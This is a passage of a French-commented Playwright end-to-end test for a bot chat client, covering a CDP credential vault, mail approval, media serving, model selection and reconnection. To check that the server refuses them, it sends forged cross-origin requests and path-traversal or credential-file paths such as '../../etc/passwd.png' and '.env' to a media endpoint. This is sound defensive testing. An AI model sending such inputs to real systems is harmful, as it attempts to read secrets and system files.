  const loginInjection = cdpInjections.at(-1)
  if (loginInjection.target !== 'onglet-steam') throw new Error('Injection dans le premier onglet au lieu du targetId demandé.')
  if (loginInjection.values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Les champs CDP ne reçoivent pas les identifiants.')
  if (cdpExpressions.some((expression) => expression.includes(BROWSER_SECRET))) throw new Error('Secret interpolé dans Runtime.evaluate.')
  if (filledBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après fill.')

  const injectionsBeforeRefusal = cdpInjections.length
  cdpUrl = 'https://example.com/login'
  const refusedBrowser = await vaultCall('fill')
  if (refusedBrowser.httpStatus !== 404 || refusedBrowser.body.error !== 'origin_not_found') throw new Error('Origine différente non refusée.')
  if (cdpInjections.length !== injectionsBeforeRefusal) throw new Error('Injection sur une origine différente.')
  const crossOrigin = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (crossOrigin.status !== 403) throw new Error('Une page web peut appeler le service des bots.')

  cdpUrl = 'https://store.steampowered.com/login/?code=1'
  const codingBrowser = vaultCall('code')
  await browserSheet.getByLabel('Code de vérification').fill(BROWSER_CODE)
  await browserSheet.getByRole('button', { name: 'Injecter le code' }).click()
  const codedBrowser = await codingBrowser
  if (codedBrowser.httpStatus !== 200 || codedBrowser.body.fields?.[0] !== 'code') throw new Error(`Code CDP refusé: ${codedBrowser.raw}`)
  if (cdpInjections.at(-1).target !== 'onglet-steam' || cdpInjections.at(-1).values[0] !== BROWSER_CODE || codedBrowser.raw.includes(BROWSER_CODE)) throw new Error('Circuit du code CDP incorrect.')

  const cancellingBrowser = vaultCall('save')
  await browserSheet.getByRole('button', { name: 'Plus tard' }).waitFor({ timeout: 3_000 })
  await browserSheet.getByRole('button', { name: 'Plus tard' }).click()
  if ((await cancellingBrowser).body.status !== 'cancelled') throw new Error('Annulation du coffre CDP incorrecte.')

  // Réglages > Coffre : l’identifiant apparaît sans mot de passe, Nova y est autorisé en plus de Orion.
  await page.keyboard.press('Meta+,')
  await page.locator('.settings-nav').getByRole('button', { name: 'Coffre' }).click()
  const vaultEntry = page.locator('.vault-entry').filter({ hasText: 'store.steampowered.com' })
  await vaultEntry.getByText('steam-test · Orion').waitFor({ timeout: 5_000 })
  if (await page.locator('.settings').getByText(BROWSER_SECRET).count()) throw new Error('Mot de passe visible dans les réglages.')
  await vaultEntry.getByRole('button', { name: 'Modifier' }).click()
  await page.locator('.vault-bot').filter({ hasText: 'Nova' }).locator('input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  await vaultEntry.getByText('steam-test · Orion, Nova').waitFor({ timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}vault-settings.png` })
  const allowedFill = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (allowedFill.status !== 200 || cdpInjections.at(-1).values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Mot de passe perdu après le changement de bots.')
  // Ajout direct depuis les réglages, puis retrait.
  await page.locator('.vault-tools').getByRole('button', { name: 'Ajouter un identifiant' }).click()
  await page.locator('.vault-form').getByLabel('Site').fill('https://exemple.com/connexion')
  await page.locator('.vault-form').getByLabel('Identifiant').fill('ajout-test')
  await page.locator('.vault-form').getByLabel('Mot de passe').fill('mot-de-passe-ajout')
  await page.locator('.vault-bot.is-all input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  const addedEntry = page.locator('.vault-entry').filter({ hasText: 'exemple.com' })
  await addedEntry.getByText('ajout-test · Tous les bots').waitFor({ timeout: 5_000 })
  page.once('dialog', (dialog) => dialog.accept())
  await addedEntry.getByRole('button', { name: 'Retirer' }).click()
  await addedEntry.waitFor({ state: 'detached', timeout: 5_000 })
  await page.getByRole('button', { name: 'Fermer les réglages' }).click()
  await page.locator('.settings-backdrop').waitFor({ state: 'detached', timeout: 3_000 })

  const browserAudit = readFileSync(BROWSER_VAULT_AUDIT, 'utf8')
  if (browserAudit.includes(BROWSER_SECRET) || browserAudit.includes(BROWSER_CODE)) throw new Error('Secret dans le journal du coffre.')
  if (serverLog.includes(BROWSER_SECRET) || serverLog.includes(BROWSER_CODE)) throw new Error('Secret dans les logs du serveur.')
  if (JSON.stringify([...clientResponses.values()]).includes(BROWSER_SECRET) || JSON.stringify([...clientResponses.values()]).includes(BROWSER_CODE)) throw new Error('Secret CDP passé par la gateway.')
  if (await page.getByText(BROWSER_SECRET).count() || await page.evaluate((secret) => JSON.stringify({ ...localStorage, ...sessionStorage }).includes(secret), BROWSER_SECRET)) throw new Error('Secret CDP conservé dans le navigateur.')

  // Carte de mail : corrigée à la main, l’envoi au bot porte ce qui a été validé et son empreinte.
  const askMail = async (id) => {
    await page.getByRole('textbox', { name: 'Message à Orion' }).fill(`Test mail ${id}`)
    await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  }
  await askMail('m1')
  await page.locator('.mail-note.is-muted').getByText('Brouillon de mail en cours').waitFor({ timeout: 3_000 })
  if (await page.locator('.messages-column').getByText('Draft-Id').count()) throw new Error('Le bloc de mail brut est visible.')
  const card = page.locator('.mail-card')
  await card.waitFor({ timeout: 5_000 })
  if (await page.locator('.messages-column').getByText('hermes-mail').count()) throw new Error('Le bloc de mail brut est visible.')
  await card.getByLabel('À', { exact: true }).fill('faux')
  if (await card.getByRole('button', { name: 'Envoyer' }).isEnabled()) throw new Error('Envoi possible avec une adresse invalide.')
  await card.getByLabel('À', { exact: true }).fill('autre@exemple.test')
  await card.getByLabel('Corps du mail').fill('Bonjour,\n\nTexte corrigé.')
  await delay(300)
  await card.scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}mail-card.png` })
  const promptsBeforeMail = promptCalls
  // Un mail validé part même si le composer est en PLAN : la consigne « ne rien envoyer » ne doit pas le suivre.
  await page.getByRole('radio', { name: 'PLAN', exact: true }).click()
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeMail + 1) throw new Error('Un clic sur Envoyer doit lancer un seul tour.')
  if (lastApiText !== undefined) throw new Error('Un mail validé ne doit pas porter la consigne du mode.')
  await page.getByRole('radio', { name: 'EXEC', exact: true }).click()
  const digest = createHash('sha256').update('Bot <bot@exemple.test>\n77\nautre@exemple.test\n\nRe: Votre demande\nBonjour,\n\nTexte corrigé.').digest('hex')
  for (const expected of ['````hermes-mail-approved', 'Id: m1', 'Draft-Id: 77', 'To: autre@exemple.test', 'Texte corrigé.', `Approved-Digest: ${digest}`]) {
    if (!lastPromptText.includes(expected)) throw new Error(`Mail approuvé sans « ${expected} ».`)
  }
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.message-assistant .mail-note').getByText('Mail approuvé : Re: Votre demande').waitFor({ timeout: 2_000 })
  await page.locator('.message-user .mail-note').getByText('Re: Votre demande, à autre@exemple.test').waitFor({ timeout: 2_000 })
  await delay(500) // le tour simulé se termine : l’envoi suivant serait ignoré tant qu’il tourne
  // Ignorer : aucun tour lancé, choix conservé après rechargement du fil.
  await askMail('m2')
  await card.waitFor({ timeout: 5_000 })
  const promptsBeforeDiscard = promptCalls
  await card.getByRole('button', { name: 'Ignorer' }).click()
  await page.locator('.mail-note.is-muted').getByText('Brouillon écarté').waitFor({ timeout: 2_000 })
  if (promptCalls !== promptsBeforeDiscard) throw new Error('Ignorer ne doit lancer aucun tour.')
  if (await page.locator('[data-bot=orion] .bot-row-preview').getByText('hermes-mail').count()) throw new Error('Le roster montre le bloc brut.')

  // Une vidéo lancée pendant le streaming continue quand le message se termine : même élément, même lecture.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test média en direct')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.message.is-streaming video.media-video').waitFor({ timeout: 5_000 })
  await page.locator('.message.is-streaming video.media-video').evaluate(async (video) => {
    video.dataset.e2eMarker = 'pendant'
    video.muted = true
    video.loop = true
    await video.play()
  })
  await page.locator('.message-assistant:not(.is-streaming)').getByText('Et la suite du texte.').waitFor({ timeout: 6_000 })
  const liveVideo = await page.locator('.message-assistant:not(.is-streaming) video.media-video').last().evaluate((video) => ({ marker: video.dataset.e2eMarker, paused: video.paused }))
  if (liveVideo.marker !== 'pendant') throw new Error('La vidéo a été recréée à la fin du streaming.')
  if (liveVideo.paused) throw new Error('La vidéo s’est arrêtée à la fin du streaming.')

  // Un NOREPLY écrit lettre par lettre n’apparaît jamais dans le fil, même pendant le streaming.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test silence')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  for (let probe = 0; probe < 20; probe += 1) {
    if (await page.locator('.messages-column').evaluate((column) => /NOREPLY|NO(?!n)\b/.test(column.innerText.split('Test silence').pop() || ''))) {
      throw new Error('Un NOREPLY en streaming est visible.')
    }
    await delay(60)
  }
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })

  // /api/media côté HTTP : session obligatoire, extensions et chemins filtrés, Range exact, en-têtes durs.
  const sessionCookie = (await page.context().cookies('http://127.0.0.1:4332')).map((cookie) => `${cookie.name}=${cookie.value}`).join('; ')
  const media = (query, headers = {}) => fetch(`http://127.0.0.1:4332/api/media?${new URLSearchParams(query)}`, { headers: { Cookie: sessionCookie, ...headers } })
  if ((await fetch('http://127.0.0.1:4332/api/media?profile=orion&path=%2FUsers%2Ftest%2Fvideos%2Fvideo.mp4')).status !== 401) throw new Error('/api/media répond sans session.')
  for (const [query, status] of [
    [{ profile: 'orion', path: '/Users/test/.env' }, 415],
    [{ profile: 'orion', path: '/Users/test/auth.json' }, 415],
    [{ profile: 'orion', path: '/Users/test/logo.svg' }, 415],
    [{ profile: 'orion', path: '/Users/test/../../etc/passwd.png' }, 400],
    [{ profile: 'orion', path: 'relatif/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels.png/' }, 400],
    [{ profile: 'orion', path: '//hote/partage/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/./test/slide.png' }, 400],
    [{ profile: '../orion', path: '/Users/test/videos/video.mp4' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels/absent.jpg' }, 404],
  ]) {
    const result = await media(query)
    await result.arrayBuffer()
    if (result.status !== status) throw new Error(`/api/media ${JSON.stringify(query)} : HTTP ${result.status} au lieu de ${status}`)
  }
  const partial = await media({ profile: 'orion', path: '/Users/test/videos/video.mp4' }, { Range: 'bytes=0-99' })
  const partialBytes = (await partial.arrayBuffer()).byteLength
  if (partial.status !== 206 || partial.headers.get('content-range') !== `bytes 0-99/${VIDEO_SIZE}` || partialBytes !== 100) {
    throw new Error(`Range vidéo mal relayé : ${partial.status} ${partial.headers.get('content-range')} ${partialBytes} octets`)
  }
  const image = await media({ profile: 'orion', path: '/Users/test/visuels/slide-02.png' })
  await image.arrayBuffer()
  if (image.status !== 200 || image.headers.get('content-type') !== 'image/png'
    || /attachment/i.test(image.headers.get('content-disposition') || '')
    || !/sandbox/.test(image.headers.get('content-security-policy') || '')
    || image.headers.get('x-content-type-options') !== 'nosniff') throw new Error('En-têtes de l’image relayée incorrects.')
  await page.getByRole('tab', { name: /Activité/ }).click()
  // L’historique et « Test silence » : deux silences, tous deux rangés dans Activité.
  await page.locator('.activity-row').getByText('NOREPLY').first().waitFor()
  await page.locator('.activity-row').getByText('Background process').first().waitFor()
  await page.locator('.activity-row').getByText('Délégation terminée').first().waitFor()
  if (await page.locator('.activity-row').getByText('demande entre bots').count()) throw new Error('Un message entre bots est resté dans Activité.')
  await page.getByRole('tab', { name: /Routines/ }).click()

  // Messages entre bots : « Nova messaged Orion », « Orion messaged Nova », « Nova replied to Orion ».
  const notes = page.locator('.messages-scroll .agent-note')
  await notes.first().waitFor({ timeout: 5_000 })
  const noteLines = await notes.locator('.agent-note-line').evaluateAll((lines) => lines.map((line) => [...line.children].filter((child) => child.tagName !== 'TIME').map((child) => child.textContent.trim()).join(' ')))
  for (const expected of ['Nova messaged Orion', 'Orion messaged Nova', 'Nova replied to Orion']) {
    if (!noteLines.includes(expected)) throw new Error(`Ligne « ${expected} » absente : ${JSON.stringify(noteLines)}`)
  }
  if (await page.locator('.messages-scroll').getByText('Peux-tu relire').count()) throw new Error('Le message entre bots doit rester fermé.')
  const sentNote = notes.filter({ hasText: 'Orion messaged Nova' })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body strong').getByText('plan').waitFor()
  await sentNote.locator('.agent-note-body').getByText('Reply needed: Un OK écrit').waitFor()
  await notes.filter({ hasText: 'Nova replied to Orion' }).getByRole('button', { name: 'replied to' }).click()
  await page.locator('.agent-note-body').getByText('Plan relu, OK écrit.').waitFor()
  await page.locator('.agent-note-body .cited-files img.media-image').waitFor({ timeout: 5_000 })
  // Un geste vers le haut décroche le fil du bas, comme l’utilisateur qui remonte.
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await notes.first().evaluate((element) => element.scrollIntoView({ block: 'start' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}agent-messages.png` })
  await sentNote.getByRole('button', { name: 'messaged' }).click()
  await sentNote.locator('.agent-note-body').waitFor({ state: 'detached' })
  // En direct : un appel `message_agent`, puis un tour lancé par le message d’un autre bot.
  const notesBefore = await notes.count()
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'tool-live-dm', name: 'message_agent', args: { target: 'nova', message: 'Envoi en direct' } }))
    send(client, event('chat-orion', 'tool.complete', { tool_id: 'tool-live-dm', name: 'message_agent' }))
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-dm', display_kind: 'internal_notification', text: 'Message from 🤖 Nova (@nova): Réveil en direct' }))
    send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-dm', text: 'Bien reçu, Nova.', status: 'complete' }))
  }
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor({ timeout: 5_000 })
  if (await notes.count() !== notesBefore + 2) throw new Error(`Messages entre bots en direct : ${await notes.count() - notesBefore} au lieu de 2`)
  await notes.last().getByRole('button', { name: 'messaged' }).click()
  await notes.last().locator('.agent-note-body').getByText('Réveil en direct').waitFor()
  await notes.filter({ hasText: 'Orion messaged Nova' }).locator('.agent-note-name').filter({ hasText: 'Nova' }).last().click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.message-assistant').getByText('Bien reçu, Nova.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test de streaming')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  try {
    await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').waitFor({ timeout: 10_000 })
    await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  } catch (error) {
    console.log('chat au moment de l’échec:', await page.locator('.messages-column').innerText())
    console.log('notice:', await page.locator('.toast').allTextContents())
    throw error
  }
  await page.locator('.routine-row').waitFor({ timeout: 5_000 })
  const routines = await page.locator('.routine-row').count()
  if (routines !== 1) throw new Error(`Routines: ${routines} au lieu de 1`)

  const rosterCallsBeforeSwitch = profilesListCalls
  await page.locator('[data-bot=nova]').click()
  await page.locator('.message-assistant').getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').first().waitFor()
  if (profilesListCalls !== rosterCallsBeforeSwitch) throw new Error('Cache: un changement de bot a relu le roster.')

  if (await page.locator('.usage-readout').count()) throw new Error('Contexte et tok/s doivent être masqués par défaut.')
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()
  await page.locator('.usage-readout').getByText('Contexte 4 % (41k/1M) · 63 tok/s').waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()

  const promptsBeforeCommand = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('/model sonnet')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  if (promptCalls !== promptsBeforeCommand) throw new Error('/model a été envoyé au bot.')
  if (await page.locator('.model-option[data-model="claude-opus-5-5"]').count()) throw new Error('/model sonnet ne filtre pas.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  if (await page.locator('.model-option[data-model="modele-interdit"]').count()) throw new Error('Fournisseur non connecté proposé.')
  page.once('dialog', (dialog) => dialog.accept())
  // Le groupe du modèle actif est ouvert, les autres sont pliés ; le pliage reste d'une ouverture à l'autre.
  const kimiGroup = page.locator('.model-group', { hasText: 'Kimi' })
  const anthropicGroup = page.locator('.model-group', { hasText: 'Anthropic' })
  if (!await anthropicGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le groupe du modèle actif doit être ouvert.')
  if (await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Les autres fournisseurs doivent être pliés.')
  // Les vrais logos passent la CSP de l'app ; tous les serveurs locaux forment un seul groupe sans logo de marque.
  await page.waitForFunction(() => {
    const logos = [...document.querySelectorAll('.model-group-tile.has-logo img')]
    return logos.length === 2 && logos.every((logo) => logo.complete && logo.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  const localGroup = page.locator('.model-group', { hasText: 'Local LLM' })
  if (await localGroup.count() !== 1) throw new Error('Les modèles locaux doivent être réunis sous Local LLM.')
  if (await localGroup.locator('.model-group-count').innerText() !== '2') throw new Error('Local LLM doit réunir oMLX et LM Studio.')
  if (await localGroup.locator('.model-group-tile.is-local svg').count() !== 1 || await localGroup.locator('img').count()) throw new Error('Local LLM doit garder son icône neutre.')
  if (await page.locator('.model-group-name', { hasText: /oMLX|LM Studio/ }).count()) throw new Error('Le nom du serveur local ne doit plus être affiché.')
  await kimiGroup.locator('.model-group-head').click()
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.waitForTimeout(400)
  const startTheme = await page.evaluate(() => document.documentElement.dataset.theme)
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-light.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(600)
  await page.screenshot({ path: `${SCREENSHOTS}model-picker-dark.png` })
  await page.evaluate((theme) => { document.documentElement.dataset.theme = theme }, startTheme)
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('Escape')
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.waitForTimeout(400)
  if (!await kimiGroup.evaluate((group) => group.classList.contains('is-open'))) throw new Error('Le pliage doit être mémorisé.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).press('ArrowUp')
  await kimiGroup.locator('.model-group-head').click()
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('k3.1')
  await kimiGroup.locator('.model-option[data-model="k3.1-pro"]').waitFor({ state: 'visible', timeout: 3_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').click()
  await page.locator('.model-chip').getByText('Sonnet 5.5').waitFor({ timeout: 5_000 })
  const lastMutation = modelMutations.at(-1)
  if (modelMutations.length !== 2) throw new Error(`session.mutate: ${modelMutations.length} appels au lieu de 2`)
  if (lastMutation?.expected_revision !== 4 || lastMutation?.expected_generation !== 1) throw new Error(`Clôtures inattendues: ${JSON.stringify(lastMutation)}`)
  if (lastMutation?.payload?.model !== 'claude-sonnet-5-5' || lastMutation?.payload?.provider !== 'anthropic' || lastMutation?.payload?.confirm !== 'confirm-test') throw new Error(`Mutation inattendue: ${JSON.stringify(lastMutation)}`)
  if (!lastMutation?.request_id || lastMutation.request_id === modelMutations[0].request_id) throw new Error('La confirmation doit avoir une nouvelle request_id.')

  // Réglages : thème, texte, touche d’envoi, puis un modèle masqué quitte le sélecteur et revient d’un clic.
  const openSettings = async () => {
    await page.getByRole('button', { name: 'Réglages', exact: true }).click()
    await settingsDialog.waitFor({ timeout: 3_000 })
  }
  const settingsDialog = page.getByRole('dialog', { name: 'Réglages' })
  await openSettings()
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-general.png` })
  await settingsDialog.getByRole('radio', { name: 'Sombre' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await settingsDialog.getByRole('radio', { name: 'Clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')
  await settingsDialog.getByRole('radio', { name: 'Grande' }).click()
  const largeText = await page.locator('.composer textarea').first().evaluate((element) => getComputedStyle(element).fontSize)
  if (largeText !== '16px') throw new Error(`Taille du texte non appliquée : ${largeText}`)
  await settingsDialog.getByRole('radio', { name: 'Normale' }).click()
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: '⌘ Entrée' }).click()
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.composer-hint-keys').first().getByText('⌘ Entrée pour envoyer').waitFor({ timeout: 3_000 })
  const promptsBeforeKeys = promptCalls
  const composerField = page.getByRole('textbox', { name: 'Message à Orion' })
  await composerField.fill('une ligne')
  await composerField.press('Enter')
  if (promptCalls !== promptsBeforeKeys || !(await composerField.inputValue()).includes('\n')) throw new Error('Avec ⌘ Entrée, Entrée doit aller à la ligne sans envoyer.')
  await composerField.fill('')
  await openSettings()
  await settingsDialog.getByRole('button', { name: 'Conversations' }).click()
  await settingsDialog.getByRole('radio', { name: 'Entrée', exact: true }).click()
  await settingsDialog.getByRole('button', { name: 'Modèles' }).click()
  const settingsSearch = settingsDialog.getByRole('textbox', { name: 'Rechercher dans les modèles' })
  await settingsSearch.fill('kimi k3')
  await settingsDialog.locator('.settings-model[data-model="kimi-k3"] input').uncheck()
  await settingsSearch.fill('sonnet')
  await settingsDialog.locator('.settings-model[data-model="claude-sonnet-5-5"] input').uncheck()
  await settingsSearch.fill('')
  await settingsDialog.press('Escape')
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })
  await page.getByRole('button', { name: 'Choisir le modèle' }).click()
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('kimi')
  await page.locator('.model-option[data-model="kimi-for-coding"]').waitFor({ timeout: 3_000 })
  if (await page.locator('.model-option[data-model="kimi-k3"]').count()) throw new Error('Un modèle masqué reste proposé.')
  await page.getByRole('button', { name: 'Gérer les modèles' }).click()
  await settingsDialog.waitFor({ timeout: 3_000 })
  await settingsDialog.locator('.settings-model-toggle', { hasText: 'Anthropic' }).click()
  await settingsDialog.locator('.settings-model[data-model="claude-fable-5-2"]').waitFor({ timeout: 3_000 })
  await page.waitForTimeout(350)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await page.waitForTimeout(400)
  await page.screenshot({ path: `${SCREENSHOTS}settings-models-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await settingsDialog.getByRole('button', { name: 'Tout afficher' }).click()
  const savedSettings = await page.evaluate(() => JSON.parse(localStorage.getItem('hermesbot-settings')))
  if (savedSettings.hiddenModels.length !== 0 || savedSettings.sendKey !== 'enter' || savedSettings.textSize !== 'normal') throw new Error(`Réglages mal enregistrés : ${JSON.stringify(savedSettings)}`)
  await settingsDialog.getByRole('button', { name: 'Fermer les réglages' }).click()
  await settingsDialog.waitFor({ state: 'detached', timeout: 3_000 })

  // Un vrai geste de l’utilisateur (molette vers le haut) décroche le fil ; un défilement programmé ne le ferait pas.
  const scrollBox = await page.locator('.messages-scroll').boundingBox()
  await page.mouse.move(scrollBox.x + scrollBox.width / 2, scrollBox.y + scrollBox.height / 2)
  await page.mouse.wheel(0, -40_000)
  await page.waitForFunction(() => document.querySelector('.messages-scroll').scrollTop < 5, null, { timeout: 5_000 })
  await delay(200)
  const scrolledTo = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test pendant lecture')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await delay(600)
  const scrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (scrollTop !== scrolledTo) throw new Error(`Le scroll a été déplacé pendant la réponse: ${scrolledTo} → ${scrollTop}`)
  await page.locator('.jump-latest').click()
  await delay(600)
  const jumpedScrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (jumpedScrollTop === 0) throw new Error('Le bouton Nouveaux messages ne descend pas.')

  // Coupure brutale de la gateway (code 1006) : le serveur doit survivre, puis l’envoi doit reprendre.
  for (const client of wss.clients) client.terminate()
  await delay(500)
  if (!(await fetch('http://127.0.0.1:4332/api/health')).ok) throw new Error('Le serveur est tombé sur une fermeture 1006.')
  const promptsBeforeReconnect = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Après coupure')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.getByText('Après coupure').first().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && promptCalls === promptsBeforeReconnect; attempt += 1) await delay(100)
  if (promptCalls === promptsBeforeReconnect) throw new Error('Envoi perdu après reconnexion.')
  await delay(400)

  // Bouton de reconnexion : statut visible, retour sans recharger la page, chat ouvert réabonné.
  const refresh = page.getByRole('button', { name: 'Reconnecter Hermes' })
  const connection = page.locator('.connection-label')
  for (const client of wss.clients) client.terminate()
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 5_000 })
  const resumesBeforeRefresh = sessionResumeCalls
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && sessionResumeCalls === resumesBeforeRefresh; attempt += 1) await delay(100)
  if (sessionResumeCalls === resumesBeforeRefresh) throw new Error('Le chat ouvert n’a pas été réabonné après reconnexion.')
  await refresh.click() // socket encore ouvert : doit être remplacé, pas doublé
  await delay(500)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (wss.clients.size !== 1) throw new Error(`Sockets ouverts après reconnexion : ${wss.clients.size} au lieu de 1.`)
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-retour', text: 'Reçu après reconnexion.', status: 'complete' }))
  await page.locator('.message-assistant').getByText('Reçu après reconnexion.').waitFor({ timeout: 3_000 })

  // Gateway injoignable : message clair, puis retour au clic suivant.
  forcedAuthStatus = 503
  await refresh.click()
  await page.locator('.toast').getByText('Hermes ne répond pas').waitFor({ timeout: 5_000 })
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 2_000 })
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}hermes-disconnected.png` })
  forcedAuthStatus = 0
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message d’erreur reste affiché après reconnexion.')

  // Identifiants gardés côté serveur, jamais dans le navigateur.
  if (JSON.parse(readFileSync(SAVED_LOGIN_FILE, 'utf8')).username !== 'test') throw new Error('Identifiants non enregistrés.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage, cookie: document.cookie }).includes('"password"'))) throw new Error('Mot de passe présent dans le navigateur.')

  // Un autre processus local, même avec le bon Origin, n’obtient rien sans cookie de session.
  const loginsBeforeForged = loginCalls
  const forged = await fetch('http://127.0.0.1:4332/api/auth/restore', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332' } })
  await forged.arrayBuffer()
  if (forged.status !== 404 || forged.headers.get('set-cookie') || loginCalls !== loginsBeforeForged) throw new Error(`Restauration sans cookie acceptée : HTTP ${forged.status}.`)

  // Session Hermes expirée : reconnexion silencieuse avec les identifiants gardés.
  const loginsBeforeExpiry = loginCalls
  expiredBefore = cookieCounter
  await refresh.click()
  await delay(300)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (loginCalls !== loginsBeforeExpiry + 1) throw new Error(`Reconnexion silencieuse : ${loginCalls - loginsBeforeExpiry} connexions au lieu de 1.`)
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion affiché malgré les identifiants gardés.')

  // Mot de passe changé : identifiants oubliés, retour à l’écran, puis reprise du même bot.
  expiredBefore = cookieCounter
  loginRefused = true
  await refresh.click()
  await page.locator('.login-card').waitFor({ timeout: 5_000 })
  await page.getByText('Identifiants enregistrés refusés').waitFor({ timeout: 2_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Des identifiants refusés doivent être oubliés.')
  loginRefused = false
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 10_000 })
